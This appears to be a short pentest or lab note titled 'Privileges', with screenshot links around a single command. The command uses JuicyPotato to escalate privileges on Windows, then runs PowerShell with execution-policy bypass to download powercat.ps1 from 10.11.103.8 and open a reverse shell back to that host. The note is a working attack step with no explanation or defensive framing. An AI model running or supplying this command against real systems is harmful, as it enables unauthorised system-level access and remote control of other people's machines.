Privileges
![[Pasted image 20240819170544.png]]

```powershell
JuicyPotato.exe -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p "C:\Windows\System32\cmd.exe" -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.11.103.8/powercat.ps1');powercat -c 10.11.103.8 -p 4236 -e cmd" -t *
```
![[Pasted image 20240819170557.png]]
![[Pasted image 20240819170605.png]]

